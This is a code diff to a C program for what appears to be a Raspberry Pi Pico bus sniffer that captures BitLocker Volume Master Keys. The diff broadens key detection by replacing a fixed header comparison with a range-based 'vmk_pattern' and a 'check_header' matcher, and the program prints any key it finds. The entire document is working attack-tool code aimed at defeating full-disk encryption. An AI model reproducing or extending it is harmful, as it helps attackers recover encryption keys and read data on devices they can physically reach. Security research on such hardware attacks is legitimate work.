@@ -96,8 +96,13 @@ static inline uint32_t fetch_message(PIO pio, uint sm) {
     }
 }
 
-static const char vmk_header[] = {
+/* static const char vmk_header[] = {
     0x2c, 0x00, 0x00, 0x0, 0x01, 0x00, 0x00, 0x00, 0x03, 0x20, 0x00, 0x00
+}; */
+
+// Support for the entire range of VMK headers
+static const char vmk_pattern[] = {
+    0x2c, 0x00, '[', 0x00, '-', 0x06, ']', 0x00, '[', 0x01, '-', 0x09, ']', 0x00, '[', 0x00, '-', 0x01, ']', 0x00, '[', 0x00, '-', 0x05, ']', 0x20, 0x00, 0x00
 };
 
 #define MAXCOUNT 512
@@ -132,6 +137,23 @@ void core1_entry() {
     }
 }
 
+int check_header(const char *buffer, size_t length) {
+    size_t j = 0;
+    for (size_t i = 0; i < length; ++i) {
+        if (vmk_pattern[i] == '[' && vmk_pattern[i + 2] == '-') {
+            // Range check
+            if (buffer[j] < vmk_pattern[i + 1] || buffer[j] > vmk_pattern[i + 3])
+                return 0;
+            // Skip the range definition characters
+            i += 4;
+        } else {
+            if (buffer[j] != vmk_pattern[i])
+                return 0;
+        }
+        ++j;
+    }
+    return 1;
+}
 
 int main() {
     set_sys_clock_khz(270000, true); // 158us
@@ -161,7 +183,8 @@ int main() {
         while((msg_buffer_ptr - popped) < 44) {
         }
         
-        if(memcmp(message_buffer + popped, vmk_header, 5) == 0) {
+        //if(memcmp(message_buffer + popped, vmk_header, 5) == 0) {
+        if (check_header(message_buffer + popped, sizeof(vmk_pattern))) {
             printf("[+] Bitlocker Volume Master Key found:\n");
 
             for(int i=0; i < 2; i++) {
